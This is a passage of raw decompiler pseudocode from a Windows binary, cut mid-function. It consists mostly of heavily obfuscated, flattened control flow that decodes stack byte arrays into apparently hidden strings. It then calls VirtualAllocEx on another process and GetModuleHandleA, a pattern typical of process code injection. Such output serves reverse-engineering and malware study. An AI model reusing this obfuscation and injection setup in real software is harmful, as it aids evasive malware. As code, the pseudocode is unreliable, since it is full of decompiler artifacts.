      goto LAB_14001b7b2;
    }
    bVar21 = bVar7 + (bVar7 & cVar6 + 0x79U) * -2 + -0x4f + cVar6 + 0x79U;
LAB_14001b824:
    if (uVar16 < uVar23) {
      in_stack_00783d9d = in_stack_016f6824;
      goto LAB_14001c2de;
    }
    if (uVar23 + 0x10 <= uVar17) {
      if (uVar17 == uVar23 + 1) {
        bVar21 = (bVar7 + cVar6 + (cVar6 - 0x21U & bVar7) * -2) - 0x3a;
        goto LAB_14001c177;
      }
      if (uVar17 == uVar23 + 2) {
        bVar21 = ('\r' - (cVar6 - 0x2fU & bVar7)) * '\x02' + cVar6 + bVar7;
        uVar23 = uVar23 + 1;
      }
      else {
        if (uVar17 != uVar23 + 3) {
          if (uVar17 != uVar23 + 5) {
            if (uVar17 == uVar23 + 4) {
              cVar22 = cVar6 + (cVar6 + 0x8bU & bVar7) * -2 + -0x42;
LAB_14001c0cd:
              bVar21 = cVar22 + bVar7;
              goto LAB_14001c0d0;
            }
            if (uVar17 != uVar23 + 9) goto LAB_14001b8a0;
            bVar21 = ('3' - (cVar6 + 0x6fU & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar16 = uVar16 + abStack_509[uVar16 - 0x1f] + uVar23 + 1;
            goto LAB_14001b7b2;
          }
          bVar21 = ('5' - (cVar6 + 0x99U & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001c1fc;
        }
        bVar21 = ('7' - (cVar6 - 0x3dU & bVar7)) * '\x02' + cVar6 + bVar7;
      }
      goto LAB_14001b7b2;
    }
    bVar21 = ('9' - (cVar6 - 0x13U & bVar7)) * '\x02' + cVar6 + bVar7;
LAB_14001b8a0:
    while( true ) {
      uVar20 = uVar23;
      if (uVar23 + uVar17 <= uVar16) break;
      while( true ) {
        do {
          uVar23 = uVar20;
          uVar25 = uVar23 + 4;
          if (uVar17 == uVar25) {
            bVar21 = ('\x06' - (cVar6 - 2U & bVar7)) * '\x02' + cVar6 + bVar7;
            goto LAB_14001c177;
          }
          if (uVar17 == uVar23 + 6) {
            bVar21 = ('0' - (cVar6 - 0x10U & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar23 = uVar23 + 1;
            goto LAB_14001b7b2;
          }
          if (uVar17 == uVar23 + 0x5a) {
            bVar21 = bVar7 + cVar6 + (cVar6 - 0x1eU & bVar7) * -2 + 0xb4;
            goto LAB_14001b7b2;
          }
          if (uVar17 == uVar23 + 1) {
            bVar21 = ('\x04' - (cVar6 - 0x2cU & bVar7)) * '\x02' + cVar6 + bVar7;
            goto LAB_14001c1da;
          }
          if (uVar17 == uVar23 + 3) {
            bVar21 = ('.' - (cVar6 - 0x3aU & bVar7)) * '\x02' + cVar6 + bVar7;
            goto LAB_14001c1f9;
          }
          if (uVar17 == uVar23 + 0x61) {
            bVar21 = bVar7 + cVar6 + (cVar6 + 0xb8U & bVar7) * -2 + 0xb0;
            goto LAB_14001c1fc;
          }
          if (uVar17 == uVar23 + 0x41) {
            cVar22 = ('\x02' - (cVar6 + 0xaaU & bVar7)) * '\x02' + cVar6;
            goto LAB_14001c0cd;
          }
          if (uVar17 == uVar23 + 0x80) {
            bVar21 = (',' - (cVar6 + 0x9cU & bVar7)) * '\x02' + cVar6 + bVar7;
            goto LAB_14001c22d;
          }
          if (uVar17 == uVar23 + 1000) {
            bVar21 = bVar7 + cVar6 + (cVar6 + 0x8eU & bVar7) * -2 + 0xac;
            uVar16 = uVar16 + abStack_509[uVar16 - 0x1f] + uVar23 + 1;
            goto LAB_14001b7b2;
          }
          uVar20 = uVar23;
        } while (uVar17 == uVar23 + 0x1000);
        uVar20 = uVar23 + 0x44;
        if (uVar25 < uVar23 + 0x4a) {
          bVar21 = ('?' - (cVar6 - 0x15U & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001b7a0;
        }
        uVar17 = uVar25;
        if (uVar25 < uVar23 + 0x9e) {
          bVar21 = (bVar7 + cVar6 + (cVar6 - 0x23U & bVar7) * -2) - 0x2e;
          goto LAB_14001b7b0;
        }
        if (uVar25 < uVar23 + 0x45) {
          bVar21 = ('\x13' - (cVar6 - 0x31U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar20;
          goto LAB_14001b7c6;
        }
        if (uVar25 < uVar23 + 0x444) {
          bVar21 = ('=' - (cVar6 - 0x3fU & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar20;
          goto LAB_14001b824;
        }
        if (uVar25 < uVar23 + 0xa5) break;
        if (uVar25 < uVar23 + 0x85) {
          bVar21 = ('\x11' - (cVar6 + 0xa5U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar20;
          goto LAB_14001bc8e;
        }
        if (uVar25 < uVar23 + 0xc4) {
          bVar21 = (';' - (cVar6 + 0x97U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar20;
          goto LAB_14001bc47;
        }
        if (uVar25 < uVar23 + 0x42c) {
          bVar21 = cVar6 + (cVar6 + 0x89U & bVar7) * -2 + -0x36 + bVar7;
          uVar23 = uVar20;
          goto LAB_14001bc0a;
        }
        if (uVar25 < uVar23 + 0x1044) {
          bVar21 = ('\x0f' - (cVar6 + 0x7bU & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar20;
          goto LAB_14001bbe6;
        }
        if (uVar23 + 0x84 <= uVar25) {
          uVar17 = uVar23 + 0xbe;
          uVar20 = uVar23 + 0x122;
          if (uVar23 + 0x17c < uVar17) {
            bVar21 = (bVar7 + cVar6 + (cVar6 - 0x28U & bVar7) * -2) - 0x10;
            uVar16 = uVar16 + abStack_509[uVar16 - 0x1f] + uVar20 + 1;
            uVar23 = uVar20;
            goto LAB_14001b7b2;
          }
          if (uVar23 + 0x123 < uVar17) {
            bVar21 = ('\"' - (cVar6 - 0x36U & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar23 = uVar20;
            goto LAB_14001c22d;
          }
          if (uVar23 + 0x522 < uVar17) {
            cVar22 = cVar6 + (cVar6 + 0xbcU & bVar7) * -2 + -0x68;
            uVar23 = uVar20;
            goto LAB_14001c0cd;
          }
          if (uVar23 + 0x183 < uVar17) {
            bVar21 = (bVar7 + cVar6 + (cVar6 + 0xaeU & bVar7) * -2) - 0x14;
            uVar23 = uVar20;
            goto LAB_14001c1fc;
          }
          if (uVar23 + 0x163 < uVar17) {
            bVar21 = (' ' - (cVar6 + 0xa0U & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar23 = uVar20;
            goto LAB_14001c1f9;
          }
          if (uVar23 + 0x1a2 < uVar17) {
            bVar21 = cVar6 + (cVar6 + 0x92U & bVar7) * -2 + -0x6c + bVar7;
            uVar23 = uVar20;
            goto LAB_14001c1da;
          }
          if (uVar23 + 0x50a < uVar17) {
            bVar21 = (bVar7 + cVar6 + (cVar6 + 0x84U & bVar7) * -2) - 0x18;
            uVar23 = uVar20;
            goto LAB_14001b7b2;
          }
          if (uVar23 + 0x142 < uVar17) {
            bVar21 = ('\x1e' - (cVar6 + 0x76U & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar23 = uVar23 + 0x123;
            goto LAB_14001b7b2;
          }
          if (uVar23 + 0x162 < uVar17) {
            bVar21 = bVar7 + cVar6 + (cVar6 + 0x68U & bVar7) * -2 + 0x90;
            uVar23 = uVar20;
            goto LAB_14001c177;
          }
          if (uVar17 <= uVar23 + 0x186) {
            uVar17 = uVar23 + 0x17c;
            uVar20 = uVar23 + 0x185;
          }
        }
      }
      bVar21 = cVar6 + (cVar6 + 0xb3U & bVar7) * -2 + -0x32 + bVar7;
      uVar23 = uVar20;
    }
    if (uVar17 < uVar23 + 0x400) {
      bVar21 = bVar7 + cVar6 + 0x79U + (cVar6 + 0x79U & bVar7) * -2 + 0xb1;
LAB_14001bc8e:
      if (uVar23 + uVar17 != 0x400) {
        if (uVar23 + 3 < uVar17) {
          bVar21 = bVar7 + (cVar6 - 0x2bU) + (cVar6 - 0x2bU & bVar7) * -2 + 0x2d;
        }
        else {
          if (uVar17 == uVar23 + 1) {
            bVar21 = bVar7 + (cVar6 - 0x39U) + (cVar6 - 0x39U & bVar7) * -2 + 0x8f;
            goto LAB_14001c177;
          }
          if (uVar17 == uVar23 + 2) {
            bVar21 = (bVar7 + cVar6 + 0xb9U + (cVar6 + 0xb9U & bVar7) * -2) - 0xf;
            uVar23 = uVar23 + 1;
            goto LAB_14001b7b2;
          }
          if (uVar17 == uVar23 + 3) {
            bVar21 = bVar7 + cVar6 + 0x81U + (cVar6 + 0x81U & bVar7) * -2 + 0x79;
            goto LAB_14001c1fc;
          }
          if (uVar17 == uVar23 + 8) {
            bVar21 = bVar7 + cVar6 + 0x57U + (cVar6 + 0x57U & bVar7) * -2 + 0x9f;
            uVar16 = uVar16 + abStack_509[uVar16 - 0x1f] + uVar23 + 1;
            goto LAB_14001b7b2;
          }
        }
LAB_14001bc47:
        if (0x27 < uVar17) {
          bVar21 = ((bVar7 - (cVar6 + 0x28U & bVar7)) + '\b') * '\x02' + cVar6;
LAB_14001c1da:
          abStack_509[uVar16 - 0x1f] =
               cVar6 + 0xa1U + (cVar6 + 0xa1U & bVar7) * -2 + -0x67 + bVar21 + bVar7;
LAB_14001c1f9:
          uVar17 = uVar17 + uVar23;
LAB_14001c1fc:
          uVar16 = uVar16 - bVar21;
          goto LAB_14001b7b2;
        }
        if (uVar23 + 0x61 < uVar17) {
          bVar21 = bVar7 + (cVar6 - 0x3eU) + (cVar6 - 0x3eU & bVar7) * -2 + 0xb2;
        }
        else {
          if (uVar17 == uVar23 + 1) {
            bVar21 = ('\n' - (cVar6 + 0xb4U & bVar7)) * '\x02' + cVar6 + 0xb4U + bVar7;
            uVar16 = uVar16 + abStack_509[uVar16 - 0x1f] + uVar23 + 1;
            goto LAB_14001b7b2;
          }
          if (uVar17 == uVar23 + 2) {
            bVar21 = (bVar7 + cVar6 + 0x98U + (cVar6 + 0x98U & bVar7) * -2) - 0x28;
            goto LAB_14001c0d0;
          }
          if (uVar17 == uVar23 + 3) {
            bVar21 = bVar7 + cVar6 + 0x7cU + (cVar6 + 0x7cU & bVar7) * -2 + 0x9c;
            goto LAB_14001c1f9;
          }
          if (uVar17 == uVar23 + 5) {
            bVar21 = (bVar7 + cVar6 + 0x6eU + (cVar6 + 0x6eU & bVar7) * -2) - 2;
            goto LAB_14001c1da;
          }
        }
LAB_14001bc0a:
        if (uVar23 < 0x42) {
LAB_14001bbe6:
          abStack_509[uVar16 - 0x1f] = bVar21;
          uVar16 = uVar16 + 1;
          goto LAB_14001b7b2;
        }
        bVar21 = (('\x1e' - (cVar6 + 0x36U & bVar7)) * '\x02' + cVar6 + bVar7) * '\x02';
LAB_14001c177:
        abStack_509[uVar16 - 0x1f] = cVar6 + 0xafU + (cVar6 + 0xafU & bVar7) * -2 + '7' + bVar7;
        uVar23 = uVar23 + 1;
        goto LAB_14001b7b2;
      }
      bVar21 = ('2' - (cVar6 + 0x1aU & bVar7)) * '\x02' + cVar6;
    }
    else {
      if (uVar17 == uVar23 + 1) {
        bVar21 = ('\x05' - (cVar6 - 0x26U & bVar7)) * '\x02' + (cVar6 - 0x26U) + bVar7;
        uVar16 = uVar16 + abStack_509[uVar16 - 0x1f] + uVar23 + 1;
        goto LAB_14001b7b2;
      }
      if (uVar17 == uVar23 + 2) {
        bVar21 = ('6' - (cVar6 - 0x34U & bVar7)) * '\x02' + (cVar6 - 0x34U) + bVar7;
        goto LAB_14001c22d;
      }
      if (uVar17 != uVar23 + 3) {
        if (uVar17 != uVar23 + 5) {
          if (uVar17 == uVar23 + 4) {
            bVar21 = ('+' - (cVar6 + 0x86U & bVar7)) * '\x02' + cVar6 + 0x86U + bVar7;
            goto LAB_14001b7b2;
          }
          if (uVar17 == uVar23 + 9) {
            bVar21 = ('\r' - (cVar6 + 0x6aU & bVar7)) * '\x02' + cVar6 + 0x6aU + bVar7;
            goto LAB_14001c177;
          }
          goto LAB_14001bc8e;
        }
        bVar21 = (bVar7 + cVar6 + 0x94U + (cVar6 + 0x94U & bVar7) * -2) - 0xc;
        goto LAB_14001c1da;
      }
      bVar21 = (bVar7 + cVar6 + 0xbeU + (cVar6 + 0xbeU & bVar7) * -2) - 0x32;
    }
LAB_14001c0d0:
    bVar11 = cVar6 + 0x93U + (cVar6 + 0x93U & bVar7) * -2 + -5 + bVar7;
    abStack_509[uVar16 - 0x1f] = bVar11;
    uVar16 = uVar16 - ((ulonglong)bVar11 + uVar23 + 1);
    uVar23 = uVar23 + 1;
LAB_14001c22d:
    bVar11 = (char)uVar16 + 0xc;
    abStack_509[uVar16 - 0x1f] = bVar11 + (bVar11 & bVar7) * -2 + -0x54 + bVar7;
    uVar17 = uVar17 + 1;
    lVar24 = uVar16 + (-1 - uVar17);
    uVar16 = lVar24 + abStack_509[lVar24 + -0x1f] + uVar23 + 1;
    goto LAB_14001b7b2;
  }
  in_stack_00783d9d = local_528;
LAB_14001c2de:
  lpBaseAddress = VirtualAllocEx(hProcess,(LPVOID)0x0,0x110,in_stack_00783d9d,in_stack_0097a7b6);
  if (lpBaseAddress == (LPVOID)0x0) goto LAB_140022c8b;
  local_78 = hProcess;
  abStack_509[1] = 0xa3;
  abStack_509[2] = 0xa8;
  abStack_509[3] = 100;
  abStack_509[4] = 0x61;
  abStack_509[5] = 0x95;
  abStack_509[6] = 0x9d;
  abStack_509[7] = 0xa1;
  abStack_509[8] = 0xa1;
  abStack_509[9] = 0xa6;
  abStack_509[10] = 0x91;
  abStack_509[0xb] = 0x96;
  abStack_509[0xc] = 0x97;
  abStack_509[0xd] = 0xf8;
  abStack_509[0xe] = 0;
  abStack_509[0xf] = 0;
  abStack_509[0x10] = 0;
  abStack_509[0x11] = 0;
  abStack_509[0x12] = 0;
  abStack_509[0x13] = 0;
  abStack_509[0x14] = 0;
  abStack_509[0x15] = 0;
  abStack_509[0x16] = 0;
  abStack_509[0x17] = 0;
  abStack_509[0x18] = 0;
  abStack_509[0x19] = 0;
  bVar21 = local_5c8;
LAB_14001c340:
  uVar20 = DAT_140a618c8;
  uVar17 = DAT_140a618d0;
LAB_14001c350:
  uVar16 = 0;
  uVar23 = uVar17;
LAB_14001c353:
  if (uVar16 < 0x19) {
    bVar7 = abStack_509[uVar16 + 1];
LAB_14001c363:
    if (uVar16 < uVar20) {
      lpModuleName = auStackY_5f8 + 0x1519776;
      goto LAB_14001ce2b;
    }
    cVar6 = (char)uVar16;
    if (uVar23 + 1 <= uVar20) {
      if (uVar20 == uVar23 + 1) {
        bVar21 = ('%' - (bVar7 & cVar6 + 0x1aU)) * '\x02' + bVar7 + cVar6 + 0x1aU;
        uVar16 = uVar16 + abStack_509[uVar16 + 1] + uVar23 + 1;
      }
      else {
        if (uVar20 == uVar23 + 2) {
          bVar21 = (bVar7 + cVar6 + 0x4eU + (cVar6 + 0x4eU & bVar7) * -2) - 0x22;
          goto LAB_14001cd9a;
        }
        if (uVar20 == uVar23 + 4) {
          bVar21 = bVar7 + cVar6 + 10U + (cVar6 + 10U & bVar7) * -2 + 0xba;
          uVar20 = uVar20 + uVar23;
          goto LAB_14001cd9a;
        }
        if (uVar20 == uVar23 + 2) {
          bVar21 = cVar6 + (cVar6 + 0x82U & bVar7) * -2 + -0xc + bVar7;
        }
        else {
          if (uVar20 != uVar23 + 5) {
            if (uVar20 != uVar23 + 3) goto LAB_14001c3d6;
            bVar21 = cVar6 - 6;
            cVar22 = '\x12';
            goto LAB_14001ccef;
          }
          bVar21 = cVar6 + (cVar6 + 0x3eU & bVar7) * -2 + -0x74 + bVar7;
          uVar23 = uVar23 + 1;
        }
      }
      goto LAB_14001c353;
    }
    bVar21 = bVar7 + (bVar7 & cVar6 + 0x5eU) * -2 + 'n' + cVar6 + 0x5eU;
LAB_14001c3d6:
    if (uVar16 < uVar23) {
      lpModuleName = auStackY_5f8 + 0x16b0418;
      goto LAB_14001ce2b;
    }
    if (uVar23 + 6 <= uVar20) {
      if (uVar20 != uVar23 + 1) {
        if (uVar20 != uVar23 + 3) {
          if (uVar20 != uVar23 + 5) {
            if (uVar20 == uVar23 + 6) {
              cVar22 = cVar6 + (cVar6 - 0x26U & bVar7) * -2 + -0x1c;
              goto LAB_14001cc36;
            }
            if (uVar20 != uVar23 + 4) goto LAB_14001c440;
            bVar21 = ('\n' - (cVar6 + 0x52U & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar16 = uVar16 + abStack_509[uVar16 + 1] + uVar23 + 1;
            goto LAB_14001c353;
          }
          bVar21 = ('&' - (cVar6 + 0x1eU & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001cd9a;
        }
        bVar21 = cVar6 + (cVar6 - 0x16U & bVar7) * -2 + -0x7c + bVar7;
        goto LAB_14001c353;
      }
      bVar21 = cVar6 + 0x72;
      cVar22 = '*';
      goto LAB_14001ccef;
    }
    bVar21 = cVar6 + (cVar6 + 0xb6U & bVar7) * -2 + -0x44 + bVar7;
LAB_14001c440:
    while (uVar17 = uVar23, uVar16 < uVar23 + uVar20) {
      while( true ) {
        do {
          uVar23 = uVar17;
          if (uVar20 == uVar23 + 0x28) {
            cVar22 = cVar6 + (cVar6 + 100U & bVar7) * -2 + -0x58;
            goto LAB_14001ccfa;
          }
          if (uVar20 == uVar23 + 0x1000) {
            bVar21 = (' ' - (cVar6 + 0x20U & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar23 = uVar23 + 1;
            goto LAB_14001c353;
          }
          if (uVar20 == uVar23 + 3) {
            bVar21 = cVar6 + (cVar6 - 0x24U & bVar7) * -2 + -0x28 + bVar7;
            goto LAB_14001c353;
          }
          if (uVar20 == uVar23 + 0x20) {
            bVar21 = cVar6 + 0x98;
            goto LAB_14001c8f3;
          }
          if (uVar20 == uVar23 + 0x400) {
            bVar21 = ('\x04' - (cVar6 + 0x54U & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar20 = uVar20 + uVar23;
            goto LAB_14001cd9a;
          }
          if (uVar20 == uVar23 + 2) {
            bVar21 = cVar6 + (cVar6 + 0x10U & bVar7) * -2 + -0x60 + bVar7;
            goto LAB_14001cd9a;
          }
          if (uVar20 == uVar23 + 0x10) {
            cVar22 = ('\x1c' - (cVar6 - 0x34U & bVar7)) * '\x02' + cVar6;
            goto LAB_14001cc36;
          }
          if (uVar20 == uVar23 + 1000) {
            bVar21 = cVar6 + (cVar6 + 0x88U & bVar7) * -2 + -0x30 + bVar7;
            goto LAB_14001cc5f;
          }
          if (uVar20 == uVar23 + 1) {
            bVar21 = ('4' - (cVar6 + 0x44U & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar16 = uVar16 + abStack_509[uVar16 + 1] + uVar23 + 1;
            goto LAB_14001c353;
          }
          uVar17 = uVar23;
        } while (uVar20 == uVar23 + 10);
        uVar20 = uVar23 + 0x40;
        uVar17 = uVar23 + 0x240;
        if (uVar20 < uVar23 + 0x2a1) {
          bVar21 = ('2' - (cVar6 + 0x1aU & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001c340;
        }
        if (uVar20 < uVar23 + 0x244) {
          bVar21 = (bVar7 + cVar6 + (cVar6 - 0x2aU & bVar7) * -2) - 4;
          goto LAB_14001c350;
        }
        if (uVar20 < uVar23 + 0x268) {
          bVar21 = cVar6 + (cVar6 + 0x92U & bVar7) * -2 + -0x6c + bVar7;
          uVar23 = uVar17;
          goto LAB_14001c363;
        }
        if (uVar20 < uVar23 + 0x1240) {
          bVar21 = ('\x16' - (cVar6 + 0x4eU & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar17;
          goto LAB_14001c3d6;
        }
        if (uVar20 < uVar23 + 0x243) break;
        if (uVar20 < uVar23 + 0x260) {
          cVar22 = ('.' - (cVar6 - 0x3aU & bVar7)) * '\x02' + cVar6;
          uVar23 = uVar17;
          goto LAB_14001c820;
        }
        if (uVar20 < uVar23 + 0x640) {
          cVar22 = cVar6 + (cVar6 + 0x82U & bVar7) * -2 + -0xc;
          uVar23 = uVar17;
          goto LAB_14001c7dc;
        }
        if (uVar20 < uVar23 + 0x242) {
          cVar22 = cVar6 + (cVar6 + 0x3eU & bVar7) * -2 + -0x74;
          uVar23 = uVar17;
          goto LAB_14001c7a3;
        }
        if (uVar20 < uVar23 + 0x250) {
          bVar21 = ('\x12' - (cVar6 - 6U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar17;
          goto LAB_14001c783;
        }
        if (uVar23 + 0x628 <= uVar20) {
          uVar20 = uVar23 + 0x2ba;
          uVar17 = uVar23 + 699;
          if (uVar23 + 0x2c0 < uVar20) {
            bVar21 = ('\x10' - (cVar6 - 0x30U & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar16 = uVar16 + abStack_509[uVar16 + 1] + uVar17 + 1;
            uVar23 = uVar17;
            goto LAB_14001c353;
          }
          if (uVar23 + 0x2fb < uVar20) {
            bVar21 = cVar6 + (cVar6 + 0x8cU & bVar7) * -2 + -0x48 + bVar7;
            uVar23 = uVar17;
            goto LAB_14001cc5f;
          }
          if (uVar23 + 0x31c < uVar20) {
            cVar22 = ('(' - (cVar6 + 0x48U & bVar7)) * '\x02' + cVar6;
            uVar23 = uVar17;
            goto LAB_14001cc36;
          }
          if (uVar23 + 0x2bf < uVar20) {
            bVar21 = cVar6 + (cVar6 + 4U & bVar7) * -2 + -0x18 + bVar7;
            uVar23 = uVar17;
            goto LAB_14001cd9a;
          }
          if (uVar23 + 0x2e3 < uVar20) {
            bVar21 = cVar6 + (cVar6 - 0x40U & bVar7) * -2 + -0x80 + bVar7;
            uVar20 = uVar20 + uVar17;
            uVar23 = uVar17;
            goto LAB_14001cd9a;
          }
          if (uVar23 + 0x12bb < uVar20) {
            cVar22 = ('\f' - (cVar6 + 0x7cU & bVar7)) * '\x02' + cVar6;
            uVar23 = uVar17;
            goto LAB_14001cbb9;
          }
          if (uVar23 + 0x2be < uVar20) {
            bVar21 = cVar6 + (cVar6 + 0x38U & bVar7) * -2 + -0x50 + bVar7;
            uVar23 = uVar17;
            goto LAB_14001c353;
          }
          if (uVar23 + 0x2db < uVar20) {
            bVar21 = ('$' - (cVar6 - 0xcU & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar23 = uVar23 + 700;
            goto LAB_14001c353;
          }
          if (uVar23 + 0x6bb < uVar20) {
            cVar22 = cVar6 + (cVar6 + 0xb0U & bVar7) * -2 + -0x20;
            uVar23 = uVar17;
            goto LAB_14001ccfa;
          }
          if (uVar20 <= uVar23 + 0x2bd) {
            uVar20 = uVar23 + 0x2c1;
            uVar17 = uVar23 + 0x2d1;
          }
        }
      }
      bVar21 = cVar6 + (cVar6 + 10U & bVar7) * -2 + -0x3c + bVar7;
      uVar23 = uVar17;
    }
    if (uVar23 + 0x20 <= uVar20) {
      if (uVar20 == uVar23 + 1) {
        bVar21 = ('<' - (cVar6 + 0x6cU & bVar7)) * '\x02' + cVar6 + bVar7;
        uVar16 = uVar16 + abStack_509[uVar16 + 1] + uVar23 + 1;
      }
      else {
        if (uVar20 == uVar23 + 2) {
          bVar21 = ('\b' - (cVar6 + 0x28U & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001cc5f;
        }
        if (uVar20 != uVar23 + 3) {
          if (uVar20 != uVar23 + 6) {
            if (uVar20 != uVar23 + 5) goto LAB_14001c823;
            bVar21 = bVar7 + (bVar7 & cVar6 + 0x4cU) * -2 + -0x14 + cVar6 + 0x4cU;
            goto LAB_14001ccfd;
          }
          bVar21 = cVar6 + 0x18;
LAB_14001c8f3:
          cVar22 = ('8' - (bVar21 & bVar7)) * '\x02' + cVar6;
          goto LAB_14001cbb9;
        }
        bVar21 = (' ' - (cVar6 + 0xa0U & bVar7)) * '\x02' + cVar6 + bVar7;
LAB_14001cd9a:
        uVar16 = uVar16 - bVar21;
      }
      goto LAB_14001c353;
    }
    cVar22 = cVar6 + (cVar6 + 0x5eU & bVar7) * -2 + -0x34;
LAB_14001c820:
    bVar21 = cVar22 + bVar7;
LAB_14001c823:
    if (uVar23 + uVar20 != 0x28) {
      if (uVar23 + 0x80 < uVar20) {
        cVar22 = cVar6 + (cVar6 + 0x66U & bVar7) * -2 + -100;
LAB_14001c7dc:
        bVar21 = cVar22 + bVar7;
LAB_14001c7df:
        if (0x60 < uVar20) {
          cVar22 = cVar6 + (cVar6 + 0x30U & bVar7) * -2 + -0x20 + bVar7;
LAB_14001cbb9:
          bVar21 = cVar22 + bVar7;
LAB_14001cbbc:
          abStack_509[uVar16 + 1] =
               ('\x0f' - (bVar7 & cVar6 + 0x8eU)) * '\x02' + bVar7 + bVar21 + cVar6 + 0x8eU;
          uVar20 = uVar20 + uVar23;
          goto LAB_14001cd9a;
        }
        if (uVar23 + 0x2a < uVar20) {
          cVar22 = (',' - (cVar6 + 0x1cU & bVar7)) * '\x02' + cVar6;
LAB_14001c7a3:
          bVar21 = cVar22 + bVar7;
        }
        else {
          if (uVar20 == uVar23 + 1) {
            bVar21 = cVar6 + (cVar6 - 0x28U & bVar7) * -2 + -0x10 + bVar7;
            uVar16 = uVar16 + abStack_509[uVar16 + 1] + uVar23 + 1;
            goto LAB_14001c353;
          }
          if (uVar20 == uVar23 + 6) {
            cVar22 = cVar6 + (cVar6 + 0x84U & bVar7) * -2 + -0x18;
            goto LAB_14001cbb9;
          }
          if (uVar20 == uVar23 + 7) {
            bVar21 = (' ' - (bVar7 & cVar6 + 0x40U)) * '\x02' + bVar7 + cVar6 + 0x40U;
            goto LAB_14001c353;
          }
          if (uVar20 == uVar23 + 3) {
            bVar21 = ('\f' - (cVar6 - 4U & bVar7)) * '\x02' + cVar6 + bVar7;
            uVar23 = uVar23 + 1;
            goto LAB_14001c353;
          }
        }
        if (uVar23 < 5) {
LAB_14001c783:
          abStack_509[uVar16 + 1] = bVar21;
          uVar16 = uVar16 + 1;
          goto LAB_14001c353;
        }
        bVar21 = (cVar6 + (cVar6 + 0x74U & bVar7) * -2 + bVar7) * '\x02' + 0x90;
      }
      else {
        if (uVar20 != uVar23 + 1) {
          if (uVar20 != uVar23 + 2) {
            if (uVar20 != uVar23 + 2) {
              if (uVar20 == uVar23 + 4) {
                cVar22 = cVar6 + (cVar6 + 0x8aU & bVar7) * -2 + -0x3c;
LAB_14001cc36:
                bVar21 = cVar22 + bVar7;
                goto LAB_14001cc39;
              }
              if (uVar20 == uVar23 + 6) {
                bVar21 = ('.' - (cVar6 + 0x46U & bVar7)) * '\x02' + cVar6 + bVar7;
                goto LAB_14001cc5f;
              }
              goto LAB_14001c7df;
            }
            bVar21 = bVar7 + (bVar7 & cVar6 + 0x56U) * -2 + -0x5a + cVar6 + 0x56U;
            goto LAB_14001cbbc;
          }
          bVar21 = (cVar6 + 0x9aU + bVar7 + (bVar7 & cVar6 + 0x9aU) * -2) - 0x36;
          goto LAB_14001c353;
        }
        bVar21 = cVar6 + 0x22;
        cVar22 = '\x1a';
LAB_14001ccef:
        cVar22 = (cVar22 - (bVar21 & bVar7)) * '\x02' + cVar6;
LAB_14001ccfa:
        bVar21 = cVar22 + bVar7;
      }
LAB_14001ccfd:
      abStack_509[uVar16 + 1] = ('!' - (bVar7 & cVar6 - 0x2eU)) * '\x02' + bVar7 + (cVar6 - 0x2eU);
      uVar23 = uVar23 + 1;
      goto LAB_14001c353;
    }
    bVar21 = ('<' - (cVar6 - 0x14U & bVar7)) * '\x02' + cVar6;
LAB_14001cc39:
    bVar11 = bVar7 + (bVar7 & cVar6 + 0x4aU) * -2 + -6 + cVar6 + 0x4aU;
    abStack_509[uVar16 + 1] = bVar11;
    uVar16 = uVar16 - ((ulonglong)bVar11 + uVar23 + 1);
    uVar23 = uVar23 + 1;
LAB_14001cc5f:
    bVar11 = (char)uVar16 + 0xa8;
    abStack_509[uVar16 + 1] = ('4' - (bVar7 & bVar11)) * '\x02' + bVar7 + bVar11;
    uVar20 = uVar20 + 1;
    lVar24 = uVar16 + (-1 - uVar20);
    uVar16 = lVar24 + abStack_509[lVar24 + 1] + uVar23 + 1;
    goto LAB_14001c353;
  }
  lpModuleName = abStack_509 + 1;
LAB_14001ce2b:
  pHVar8 = GetModuleHandleA((LPCSTR)lpModuleName);
  memset(local_188,0,0x110);
  local_4e8 = 0x5f5ba87a;
  local_4e4 = 0xad5e5676;
  local_4e0 = 0x60bbb35d;
  local_4dc = 0x22;
  local_4db = 0;
  uStack_4d3 = 0;
  local_4cb = 0;
  local_4c9 = 0;
  bVar21 = local_5c8;
LAB_14001ce90:
  uVar20 = DAT_140a618c8;
  uVar17 = DAT_140a618d0;
LAB_14001cea0:
  uVar16 = 0;
  uVar23 = uVar17;
LAB_14001cea2:
  if (uVar16 < 0x20) {
    bVar7 = abStack_509[uVar16 + 0x21];
    cVar6 = (char)uVar16;
LAB_14001cec0:
    if (uVar16 < uVar20) {
      puVar14 = (undefined4 *)(auStackY_5f8 + 0x171caeb);
      goto LAB_14001d860;
    }
    if (uVar23 + 1 <= uVar20) {
      if (uVar20 != uVar23 + 1) {
        if (uVar20 == uVar23 + 3) {
          bVar21 = bVar7 + cVar6 + 0x91U + (cVar6 + 0x91U & bVar7) * -2 + 9;
          goto LAB_14001d783;
        }
        if (uVar20 == uVar23 + 2) {
          bVar21 = (bVar7 + (cVar6 - 0x21U) + (cVar6 - 0x21U & bVar7) * -2) - 0x19;
          goto LAB_14001d755;
        }
        if (uVar20 == uVar23 + 2) {
          bVar21 = (bVar7 + cVar6 + 0x2dU + (cVar6 + 0x2dU & bVar7) * -2) - 0x3b;
          uVar20 = uVar20 + uVar23;
          goto LAB_14001d755;
        }
        if (uVar20 != uVar23 + 6) goto LAB_14001cf30;
        bVar21 = cVar6 + (cVar6 + 0x65U & bVar7) * -2 + -0x5e + bVar7;
